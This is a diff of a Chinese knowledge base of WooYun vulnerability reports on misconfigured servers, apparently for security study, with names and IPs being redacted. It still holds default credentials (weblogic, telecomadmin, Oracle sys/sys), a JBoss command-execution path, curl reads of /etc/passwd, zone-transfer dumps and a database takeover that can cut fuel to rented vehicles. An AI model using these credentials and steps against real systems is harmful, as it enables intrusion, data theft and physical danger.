@@ -26,10 +26,10 @@
 ## 典型案例
 
 ### 案例 1: wooyun-2015-092186
-**标题**: 新浪微博某服务配置不当导致任意文件读取(包括root账号hash及员工svn账号密码等)
+**标题**: 某社交平台某社交平台某服务配置不当导致任意文件读取(包括root账号hash及员工svn账号密码等)
 **原始类型**: 漏洞类型：系统/服务运维配置不当
 **URL示例**: 
-  - `https://svn1.intra.sina.com.cn/weibo_bp/uve_render/render/v4/RSPATH=/data0/www/codePublish/svn_mobil...`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
 **Payload片段**:
   ```
@@ -43,11 +43,11 @@
   ```
 
 ### 案例 2: wooyun-2015-095043
-**标题**: 某地有线电视公司运维不当导致全部核心机房服务器和部分内网漫游
+**标题**: 某单位存在安全漏洞运维不当导致全部核心机房服务器和部分内网漫游
 **原始类型**: 漏洞类型：系统/服务运维配置不当
 **URL示例**: 
-  - `http://[IP]:8089/OTNM2000_ch/一看还开放了3389这不是给突破网络边界提供条件吗？看看权限，分分钟加账号.然后我们百度看看这个服务器上的OTNM2000是做什么的.结果发现...`
-  - `http://[IP]:8089/OTNM2000_ch/一看还开放了3389这不是给突破网络边界提供条件吗？看看权限，分分钟加账号.然后我们百度看看这个服务器上的OTNM2000是做什么的.结果发现...`
+  - `http://[IP]:8089/OTNM2000_ch/一看还开放了3389这不是给突破网络边界提供条件吗？看看权限，分分钟加账号.然后我们某搜索引擎看看这个服务器上的OTNM2000是做什么的.结果发现...`
+  - `http://[IP]:8089/OTNM2000_ch/一看还开放了3389这不是给突破网络边界提供条件吗？看看权限，分分钟加账号.然后我们某搜索引擎看看这个服务器上的OTNM2000是做什么的.结果发现...`
 **洞察提取**:
 
 ### 案例 3: wooyun-2015-0127250
@@ -55,8 +55,8 @@
 **原始类型**: 漏洞类型：系统/服务运维配置不当
 **参数**: `version`
 **URL示例**: 
-  - `http://wd.suning.com/的头像的上传处，可任意传asp/aspx/php/jsp/jspx/html/txt/等格式。但上传后发现文件被上传http://wd.suning.cn这个...`
-  - `http://wd.suning.com/的头像的上传处，可任意传asp/aspx/php/jsp/jspx/html/txt/等格式。但上传后发现文件被上传http://wd.suning.cn这个...`
+  - `https://example.com/[已脱敏]`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
 
 ### 案例 4: wooyun-2012-08726
@@ -68,12 +68,12 @@
 **标题**: 逐浪CMS特定版本疑似存在一个鸡肋后门
 **原始类型**: 漏洞类型：默认配置不当
 **URL示例**: 
-  - `http://www.zoomla.cn/down/Zoomla!CMS2_X1.0.rarhttp://www.zoomla.cn/down/Zoomla!CMS2_x1.1.rar其它版本均未存在...`
+  - `https://example.com/[已脱敏]`
   - `http://localhost:9000/z/Plugins/baike_editor/uploadsss.php`
 **洞察提取**:
 **Payload片段**:
   ```
-  or\uploadsss.php官方包下载地址：http://www.zoomla.cn/down/Zo
+  or\uploadsss.php官方包下载地址：https://example.com/[已脱敏]
   ```
   ```
   or']) {//上传失败$errno	= 3;}if ($_FILES['userfile']['si
@@ -94,32 +94,32 @@
 **原始类型**: 漏洞类型：系统/服务运维配置不当
 **参数**: `rd`
 **URL示例**: 
-  - `http://sec.lenovo.com/Home/PopUpIndex/#/Login/Login?rd=%2f点击忘记密码这里有验证码，坑爹的是验证码可重复利用`
-  - `http://sec.lenovo.com/Home/PopUpIndex/#/Login/Login?rd=%2f点击忘记密码这里有验证码，坑爹的是验证码可重复利用`
+  - `https://example.com/[已脱敏]`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - 漏洞地址:http://sec.lenovo.com/Home/PopUpIndex/#/Login/Login?rd=%2f点击忘记密码这里有验证码，坑爹的是验证码可重复利用 不会变，于是就从这个地方开始爆破用户名爆破出了用户名再从登陆的地方爆破密码，最后真的成功了一个然后就是各种信息泄露，看图不说话
+  - 漏洞地址:https://example.com/[已脱敏] 不会变，于是就从这个地方开始爆破用户名爆破出了用户名再从登陆的地方爆破密码，最后真的成功了一个然后就是各种信息泄露，看图不说话
 
 ### 案例 8: wooyun-2015-0134382
-**标题**: 某省移动配置不当导致部分用户信息泄漏
+**标题**: 某单位存在安全漏洞分用户信息泄漏
 **原始类型**: 漏洞类型：应用配置错误
 **洞察提取**:
   - **.**.**.**/cmm/login.php**.**.**.**/ 遍历**.**.**.**/slfm.php 123456  这是一个php的管理工具就像一个shell上传一句话还能实时定位员工
 
 ### 案例 9: wooyun-2015-0163274
-**标题**: 东莞证券某站弱口令到SQL注入导致用户(姓名\电话\邮箱等)信息泄露
+**标题**: 某单位存在安全漏洞某站弱口令到SQL注入导致用户(姓名\电话\邮箱等)信息泄露
 **原始类型**: 漏洞类型：应用配置错误
 **参数**: `ObjName, MODE, Target, Title`
 **URL示例**: 
   - `http://[IP]:81/login.do`
   - `http://[IP]:81X-Requested-With:`
 **洞察提取**:
-  - http://113.78.134.110:81/login.do 弱口令admin：000000发现了一些有意思的功能，比如可以控制提成若是我直接修改了提成的公式，然后勾搭一两个人那啥(好暴利)。
+  - http://[IP已脱敏] 弱口令admin：000000发现了一些有意思的功能，比如可以控制提成若是我直接修改了提成的公式，然后勾搭一两个人那啥(好暴利)。
 **Payload片段**:
   ```
   ormulaEdit/xcfa/XCFA_operater.jsp?MODE=getRYJB HTTP/
   ```
   ```
-  Origin: http://113.78.134.110:81X-Requested-With: XM
+  Origin: http://[IP已脱敏]X-Requested-With: XM
   ```
   ```
   ; Intel Mac OS X 10_11_2) Apple
@@ -139,18 +139,18 @@
 **标题**: IT分众子站源代码泄露
 **原始类型**: 漏洞类型：系统/服务运维配置不当
 **URL示例**: 
-  - `http://img.itcpn.net/css/.svn其中包含svn信息用户名弱密码hanlei`
-  - `http://img.itcpn.net/css/.svn其中包含svn信息,弱密码svn用户名hanlei`
+  - `https://example.com/[已脱敏]`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - img.itcpn.net 存在目录遍历http://img.itcpn.net/css/.svn其中包含svn信息用户名弱密码hanlei 123456
+  - img.itcpn.net 存在目录遍历https://example.com/[已脱敏] 123456
 
 ### 案例 13: wooyun-2015-094576
-**标题**: 上海机场集团某分站配置不当
+**标题**: 某单位存在安全漏洞某分站配置不当
 **原始类型**: 漏洞类型：系统/服务运维配置不当
 **洞察提取**:
 
 ### 案例 14: wooyun-2015-0121507
-**标题**: 招商银行某分站可直shell入内网
+**标题**: 某单位存在安全漏洞某分站可直shell入内网
 **原始类型**: 漏洞类型：系统/服务运维配置不当
 **URL示例**: 
   - `http://[IP]:9999st2远程命令执行`
@@ -184,7 +184,7 @@
 #### wooyun-2015-0109570
 **酷狗某设计缺陷可劫持部分用户测试成功**
 - 参数: `repassword, code, reg_btn, userName, password`
-- Payload: `ord=scope123&sm=&login_btn=用户密码都出来了http://fanxing.ku`
+- Payload: `ord=scope123&sm=&login_btn=用户密码都出来了https://example.com/[已脱敏]`
 
 #### wooyun-2013-037900
 **赛迪网服务运维不当导致多个站点信息泄露**
@@ -193,16 +193,16 @@
 #### wooyun-2015-0137135
 **诺安基金某系统弱口令引发的getshell（服务器处于内网）**
 - 洞察:
-  - 诺安基金某系统弱口令引发的getshell与内网漫游http://121.34.253.167:7001/weblogic 默认口令：weblogic:weblogic进去直接能getshell!：http://121.34.253.167:7001/Ninty/Ninty.jsp  xx   （自行删除）内网环境还是比较大的，。。。。。粗略看了下。。。未深入另外附内网IP证明：
+  - 诺安基金某系统弱口令引发的getshell与内网漫游http://[IP已脱敏] 默认口令：weblogic:weblogic进去直接能getshell!：http://[IP已脱敏]  xx   （自行删除）内网环境还是比较大的，。。。。。粗略看了下。。。未深入另外附内网IP证明：
 
 #### wooyun-2015-0125497
 **北京电视台某业务平台远程命令执行**
 - 参数: `pwd, cmd`
 - 洞察:
-  - 1. BTV新闻爆料http://123.125.207.1482. JBOSS 配置不当3. /invoker/JMXInvokerServlet远程命令执行http://123.125.207.148/invoker/JMXInvokerServlet4. 命令执行http://123.125.207.148/is/cmd.jsp?pwd=023&cmd=ipconfig
+  - 1. BTV新闻爆料http://[IP已脱敏]2. JBOSS 配置不当3. /invoker/JMXInvokerServlet远程命令执行http://[IP已脱敏] 命令执行http://[IP已脱敏]
 
 #### wooyun-2015-0125697
-**微信电影票  邮箱地址任意伪造，可以冒充员工对外钓鱼哦**
+**某互联网公司电影票  邮箱地址任意伪造，可以冒充员工对外钓鱼哦**
 
 #### wooyun-2014-066655
 **顺丰速运DNS域传送漏洞**
@@ -211,7 +211,7 @@
 #### wooyun-2013-036270
 **重钢集团投票系统权限设置不当可直接下载网站源码甚至脱库**
 - 洞察:
-  - 服务器权限配置不当，可直接下载全站源码，进而获取管理员权限，并脱库...http://113.204.164.234:8086/
+  - 服务器权限配置不当，可直接下载全站源码，进而获取管理员权限，并脱库...http://[IP已脱敏]
 - Payload: `;$DBUSER="root";$DBPWD="";$DBNA`
 
 ---
@@ -246,7 +246,7 @@
 #### wooyun-2015-0102427
 **化龙巷服务器配置不当导致敏感信息泄露**
 - 洞察:
-  - SVN配置不当导致源码泄露http://www.hualongxiang.com/.svn/entries
+  - SVN配置不当导致源码泄露https://example.com/[已脱敏]
 
 ---
 
@@ -282,8 +282,8 @@
 #### wooyun-2014-077496
 **微盟某服务器配置不当导致全站数据泄露**
 ---
-### [wooyun-2015-0107713] 中国电信某系统运维不当导致可发布活动和修改活动
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0107713] 某运营商某系统运维不当导致可发布活动和修改活动
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 后台管理
 
@@ -294,7 +294,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主页地址http://eshare.189.cn/活动专区后台地址http://event.eshare.189.cn/index.php?m=index&a=logincyycyy123
+**详情**: 主页地址https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -316,7 +316,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. 过程就简单掠过了....此IP居然开放了1521端口.....我勒个去http://180.153.142.34  访问确定厂商  车辆管理系统给一枚权限账号测试验证：atzc  密码：xgy123456782. 既然开放1521端口 那就直接猜解信息吧  数据库名默认：orcl密码直接sysdba权限登录  账号sys  密码：sys顺利拿下数据库3. 直接去管理员用户表 明文密码然后再来看看其他的表其中发现一张用户权限表和车台指令表... 可断油... 车控台复位 限速登陆账号验证：实时定位信息从车辆安装终端来看 将会有7100台汽车受影响最后来一张车辆定位的数据表 GPS坐标/里程数==信息 修改数据不要给租车费？
+**详情**: 1. 过程就简单掠过了....此IP居然开放了1521端口.....我勒个去http://[IP已脱敏]  访问确定厂商  车辆管理系统给一枚权限账号测试验证：atzc  密码：xgy123456782. 既然开放1521端口 那就直接猜解信息吧  数据库名默认：orcl密码直接sysdba权限登录  账号sys  密码：sys顺利拿下数据库3. 直接去管理员用户表 明文密码然后再来看看其他的表其中发现一张用户权限表和车台指令表... 可断油... 车控台复位 限速登陆账号验证：实时定位信息从车辆安装终端来看 将会有7100台汽车受影响最后来一张车辆定位的数据表 GPS坐标/里程数==信息 修改数据不要给租车费？
 
 **POC**: (见原文)
 
@@ -370,8 +370,8 @@
 ---
 
 ---
-### [wooyun-2014-049406] 中国电信路由器默认配置不当导致用户ADSL账号密码及物理位置泄露
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 默认配置不当
+### [wooyun-2014-049406] 某运营商路由器默认配置不当导致用户ADSL账号密码及物理位置泄露
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -382,7 +382,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国电信路由器默认配置不当导致用户ADSL账号密码及物理位置泄露
+**详情**: 某运营商路由器默认配置不当导致用户ADSL账号密码及物理位置泄露
 
 **POC**: 首先，我们先找到一个活跃的IP段，开启扫描，就会得到以下结果注意网页标题“F460”的地址，在浏览器打开这个IP地址要输入账号密码，怎么办？别着急，一般电信猫通用的账号密码就是telecomadmin 以及 nE7[马赛克]m 而且没有限制外网访问，猜测应该是故意留下的后门进去啦，但是怎么能查到详细的信息呢？发现电信对于网页表单value加密了，但是我懒得去找解密方法，按下F12，然后点击“修改”，明文密码就出现了根据电话号码的区号查询，这个电话属于广西南宁市电信，那么我们就打开广西电信的官网，按照我们得到的宽带密码登陆吧登陆成功以后，电话，手机，宽带信息就随便查了
 
@@ -406,7 +406,7 @@
 
 **详情**: opera软件 DNS域传送
 
-**POC**: opera.com.		3600	IN	SOA	nic1.opera.com. hostmaster.opera.com. 2015090200 3600 900 1209600 86400opera.com.		600	IN	A	82.145.215.49opera.com.		3600	IN	TXT	"v=spf1 ip4:213.236.208.184 ip4:91.203.97.254 ip4:213.236.208.188 ip4:185.26.183.133 ip4:185.26.183.134 ip4:185.26.183.135 ip4:185.26.183.145 ip6:2
+**POC**: opera.com.		3600	IN	SOA	nic1.opera.com. hostmaster.opera.com. 2015090200 3600 900 1209600 86400opera.com.		600	IN	A	[IP已脱敏]opera.com.		3600	IN	TXT	"v=spf1 ip4:[IP已脱敏] ip4:[IP已脱敏] ip4:[IP已脱敏] ip4:[IP已脱敏] ip4:[IP已脱敏] ip4:[IP已脱敏] ip4:[IP已脱敏] ip6:2
 
 **绕过**: 直接利用
 
@@ -450,7 +450,7 @@
 
 **详情**: 
 
-**POC**: http://women.sohu.com/xingzuo/Templates/recommend.php3?id=<?http://women.sohu.com/xingzuo/Templates/sendinfo.php3?id=<?<?$oraconn = OCILogon("women","women","women");if ($oraconn <= 0){echo  "<META HTTP-EQUIV=\"REFRESH\" CONTENT=\"0; URL=errlogin.html\">";OCILogOff($oraconn);exit;}if(isset($id) and 
+**POC**: https://example.com/[已脱敏] = OCILogon("women","women","women");if ($oraconn <= 0){echo  "<META HTTP-EQUIV=\"REFRESH\" CONTENT=\"0; URL=errlogin.html\">";OCILogOff($oraconn);exit;}if(isset($id) and 
 
 **绕过**: 直接利用
 
@@ -492,9 +492,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 访问http://www.foowu365.com/base/install/地址可以直接重新安装数据库，重置后台密码。去申请个免费mysql数据库，填入相关数据可信息，点“下一步”直接重新安装，这样会让网站恢复原始数据了，当然安装的时候会让你输入管理账号和密码，你可以通过输入的管理账号和密码直接进入后台 ，可以干好多事情，后果不可设想。
+**详情**: 访问https://example.com/[已脱敏] ，可以干好多事情，后果不可设想。
 
-**POC**: 访问http://www.foowu365.com/base/install/地址可以直接重新安装数据库，重置后台密码。去申请个免费mysql数据库，填入相关数据可信息，点“下一步”直接重新安装，这样会让网站恢复原始数据了，当然安装的时候会让你输入管理账号和密码，你可以通过输入的管理账号和密码直接进入后台 ，可以干好多事情，后果不可设想。
+**POC**: 访问https://example.com/[已脱敏] ，可以干好多事情，后果不可设想。
 
 **绕过**: 直接利用
 
@@ -580,7 +580,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 扫描到有2个分站web.xml可访问http://my.women.sohu.com/http://photo.pic.sohu.com/WEB-INF/web.xml
+**详情**: 扫描到有2个分站web.xml可访问https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -604,7 +604,7 @@
 
 **详情**: 此处省略........78个字，具体看证明吧。
 
-**POC**: 漏洞证明http://swdata.cma.gov.cn/sites/default/files/field/image/1.txt列目录http://swdata.cma.gov.cn/node/1?y=/var/www/html/includes/其他人预留的后门/sites/default/files/2.php/sites/default/files/3.php/sites/default/files/x.php
+**POC**: 漏洞证明https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -612,8 +612,8 @@
 ---
 
 ---
-### [wooyun-2012-06830] 百度文库网站跨域策略文件配置不严格
-**厂商**: 百度 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-06830] 某搜索引擎文库网站跨域策略文件配置不严格
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -668,7 +668,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞介绍http://www.exploit-db.com/exploits/19525/http://global.m6go.com
+**详情**: 漏洞介绍https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -690,13 +690,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 客户列表 http://gov.ishang.net/case/custom.html测试了60.***.***.252106.***.***.97看了一下有40多个客户，时间关系就不一一测试了
+**详情**: 客户列表 https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 修复请参考 http://drops.wooyun.org/tips/2470
+**修复**: 修复请参考 https://example.com/[已脱敏]
 ---
 
 ---
@@ -712,18 +712,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.mod.gov.cn/ns1.mod.gov.cn 和 ns2.mod.gov.cn DNS服务器配置不当，导致所有域名dns泄露。
+**详情**: https://example.com/[已脱敏] 和 ns2.mod.gov.cn DNS服务器配置不当，导致所有域名dns泄露。
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考：http://drops.wooyun.org/papers/64
+**修复**: 参考：https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2012-06886] 中国联通NMS系统目录列表
-**厂商**: 中国联通 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-06886] 某运营商NMS系统目录列表
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -734,7 +734,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国联通NMS系统目录列表http://123.125.96.176:7001/nmsframe/nmsframeinstall/Apache Tomcat/5.0.28
+**详情**: 某运营商NMS系统目录列表http://[IP已脱敏] Tomcat/5.0.28
 
 **POC**: (见原文)
 
@@ -778,7 +778,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.chinamacro.cn/console/  weblogic  12345678http://scm.chinamacro.cn:8001/ weblogic反序列化http://scm.chinamacro.cn/console/  weblogic  12345678http://218.13.34.122:8082/  weblogic反序列化http://www.chinamacro.cn/h/f.jsphttp://218.13.34.122:8082/f.jsphttp://scm.chinamacro.cn/f.jsp
+**详情**: https://example.com/[已脱敏]  weblogic  12345678https://example.com/[已脱敏] weblogic反序列化https://example.com/[已脱敏]  weblogic  12345678http://[IP已脱敏]  weblogic反序列化https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -800,7 +800,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://61.178.48.40/甘肃省兰州市信访局http://61.178.48.40/test.txt
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -811,7 +811,7 @@
 
 ---
 ### [wooyun-2015-0103850] 天翼视讯DNS域传送漏洞
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -844,13 +844,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 42.121.33.67 MongoDB 配置不当
+**详情**: [IP已脱敏] MongoDB 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参照 MongoDB安全配置 http://drops.wooyun.org/tips/2470
+**修复**: 参照 MongoDB安全配置 https://example.com/[已脱敏]
 ---
 
 ---
@@ -866,7 +866,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这台的未正确设置ns1.ufsoft.com.cnTrying Zone Transfer for yonyou.com on ns1.ufsoft.com.cn ...yonyou.com                               3600     IN    SOAyonyou.com                               3600     IN    A        125.35.5.132yonyou.com                               3600     IN    NSyonyou.com                               3600     IN    NSyonyou.com                               3600     IN    NSyonyo
+**详情**: 这台的未正确设置ns1.ufsoft.com.cnTrying Zone Transfer for yonyou.com on ns1.ufsoft.com.cn ...yonyou.com                               3600     IN    SOAyonyou.com                               3600     IN    A        [IP已脱敏]yonyou.com                               3600     IN    NSyonyou.com                               3600     IN    NSyonyou.com                               3600     IN    NSyonyo
 
 **POC**: (见原文)
 
@@ -876,8 +876,8 @@
 ---
 
 ---
-### [wooyun-2012-08070] 百度某站遍历目录漏洞
-**厂商**: 百度 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-08070] 某搜索引擎某站遍历目录漏洞
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -888,7 +888,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://its.map.baidu.com:8002/traffic/http://its.map.baidu.com:8002/managetomcat web server administration tool:http://its.map.baidu.com:8002/admin
+**详情**: https://example.com/[已脱敏] web server administration tool:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -910,7 +910,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 哗啦啦北京格致璞科技旗下知名站点DNS域传送漏洞：C:\Users\Administrator>nslookup默认服务器:  google-public-dns-a.google.comAddress:  8.8.8.8> set type=ns> hualala.com服务器:  google-public-dns-a.google.comAddress:  8.8.8.8非权威应答:hualala.com     nameserver = sns.gozap.comhualala.com     nameserver = ns.gozap.com> server sns.gozap.com默认服务器:  sns.gozap.comAddress:  58.68.151.18> ls hualala.com[sns.gozap.com]hualala.com.             
+**详情**: 哗啦啦北京格致璞科技旗下知名站点DNS域传送漏洞：C:\Users\Administrator>nslookup默认服务器:  google-public-dns-a.google.comAddress:  [IP已脱敏]> set type=ns> hualala.com服务器:  google-public-dns-a.google.comAddress:  [IP已脱敏]非权威应答:hualala.com     nameserver = sns.gozap.comhualala.com     nameserver = ns.gozap.com> server sns.gozap.com默认服务器:  sns.gozap.comAddress:  [IP已脱敏]> ls hualala.com[sns.gozap.com]hualala.com.             
 
 **POC**: 如上
 
@@ -920,8 +920,8 @@
 ---
 
 ---
-### [wooyun-2014-086600] 京东jae绕过虚拟机读取系统任意文件
-**厂商**: 京东商城 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-086600] 某电商平台jae绕过虚拟机读取系统任意文件
+**厂商**: 某电商平台商城 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 上传功能
 
@@ -932,7 +932,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 京东jae虽然个人用户的执行环境是虚拟机，但是在git上传代码是会把创建的link带入，从而在同步到虚拟环境时读取文件
+**详情**: 某电商平台jae虽然个人用户的执行环境是虚拟机，但是在git上传代码是会把创建的link带入，从而在同步到虚拟环境时读取文件
 
 **POC**: 这个是宿主机的passwd宿主机的hosts，里面有很多内网的域名127.0.0.1	localhost127.0.1.1	ubuntu# The following lines are desirable for IPv6 capable hosts::1     ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters***.***.137.245 api.jd-app.com***.***.131.57 	code.jd.c
 
@@ -954,13 +954,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标网站：http://www.101.com.tw/为购物商城。; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @ns1.addcn.com.tw. axfr 101.com.tw; (1 server found);; global options: +cmd101.com.tw.		90	IN	SOA	ns2.addcn.com.tw. ronman.8591.com.tw. 2014073101 10800 3600 604800 86400101.com.tw.		90	IN	NS	ns1.518.com.tw.101.com.tw.		90	IN	NS	ns1.addcn.com.tw.101.com.tw.		90	IN	NS	ns2.addcn.com.tw.101.com.tw.		90	IN	NS	ns3.addcn.com.tw.101.
+**详情**: 目标网站：https://example.com/[已脱敏] <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @ns1.addcn.com.tw. axfr 101.com.tw; (1 server found);; global options: +cmd101.com.tw.		90	IN	SOA	ns2.addcn.com.tw. ronman.8591.com.tw. 2014073101 10800 3600 604800 86400101.com.tw.		90	IN	NS	ns1.518.com.tw.101.com.tw.		90	IN	NS	ns1.addcn.com.tw.101.com.tw.		90	IN	NS	ns2.addcn.com.tw.101.com.tw.		90	IN	NS	ns3.addcn.com.tw.101.
 
 **POC**: ; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @ns1.addcn.com.tw. axfr 101.com.tw; (1 server found);; global options: +cmd101.com.tw.		90	IN	SOA	ns2.addcn.com.tw. ronman.8591.com.tw. 2014073101 10800 3600 604800 86400101.com.tw.		90	IN	NS	ns1.518.com.tw.101.com.tw.		90	IN	NS	ns1.addcn.com.tw.101.com.tw.		90
 
 **绕过**: 直接利用
 
-**修复**: 修复请参考http://www.myhack58.com/Article/html/3/62/2013/38149_2.htm
+**修复**: 修复请参考https://example.com/[已脱敏]
 ---
 
 ---
@@ -976,7 +976,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这儿 http://files.leiphone.com/影响全站用户直接浏览源代码，无语。。读一下代码找到配置文件在这儿http://files.leiphone.com/protected/config/main-test.php然后就'wankrDb' => ['connectionString'  => 'mysql:host=113.106.92.93;dbname=wankr100','emulatePrepare'    => true,'username'          => 'www','password'          => 'root','charset'           => 'utf8','tablePrefix'	    => 'yp_',直接外联数据库了
+**详情**: 这儿 https://example.com/[已脱敏]'wankrDb' => ['connectionString'  => 'mysql:host=[IP已脱敏];dbname=wankr100','emulatePrepare'    => true,'username'          => 'www','password'          => 'root','charset'           => 'utf8','tablePrefix'	    => 'yp_',直接外联数据库了
 
 **POC**: (见原文)
 
@@ -1020,7 +1020,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主站上方的登陆口抓包http://www.8684.cn/发送包：POST /8684/ajax.php?cmd=ajlogin HTTP/1.1Host: passport.8684.comProxy-Connection: keep-aliveAccept: */*Origin: http://passport.8684.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://passport.8684.com/
+**详情**: 主站上方的登陆口抓包https://example.com/[已脱敏] /8684/ajax.php?cmd=ajlogin HTTP/1.1Host: passport.8684.comProxy-Connection: keep-aliveAccept: */*Origin: https://example.com/[已脱敏] XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -1030,8 +1030,8 @@
 ---
 
 ---
-### [wooyun-2012-05863] 腾讯WEBQQ可以添加EXE文件
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-05863] 某互联网公司WEB某互联网公司可以添加EXE文件
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -1042,9 +1042,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在webqq中添加自定义表情时可以添加exe文件，然后发表情给对方，接下来就是（有主机上线请注意）
+**详情**: 在web某互联网公司中添加自定义表情时可以添加exe文件，然后发表情给对方，接下来就是（有主机上线请注意）
 
-**POC**: 已经有几个测试成功了  你们自己测试  记住 webQQ
+**POC**: 已经有几个测试成功了  你们自己测试  记住 web某互联网公司
 
 **绕过**: 直接利用
 
@@ -1108,7 +1108,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通过访问 http://bank.ecitic.com/personal/ 可获得中信银行网站的目录结构。
+**详情**: 通过访问 https://example.com/[已脱敏] 可获得中信银行网站的目录结构。
 
 **POC**: (见原文)
 
@@ -1130,9 +1130,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: [root@localhost ~]# curl http://auto.smartisan.com/etc/my.cnf[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockuser=mysql# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0[mysqld_safe]log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pid[root@localhost ~]# curl http://auto.smartisan.com/etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:
+**详情**: [root@localhost ~]# curl https://example.com/[已脱敏]]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockuser=mysql# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0[mysqld_safe]log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pid[root@localhost ~]# curl https://example.com/[已脱敏]
 
-**POC**: [root@localhost ~]# curl http://auto.smartisan.com/etc/my.cnf[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockuser=mysql# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0[mysqld_safe]log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.p
+**POC**: [root@localhost ~]# curl https://example.com/[已脱敏]]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockuser=mysql# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0[mysqld_safe]log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.p
 
 **绕过**: 直接利用
 
@@ -1196,7 +1196,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
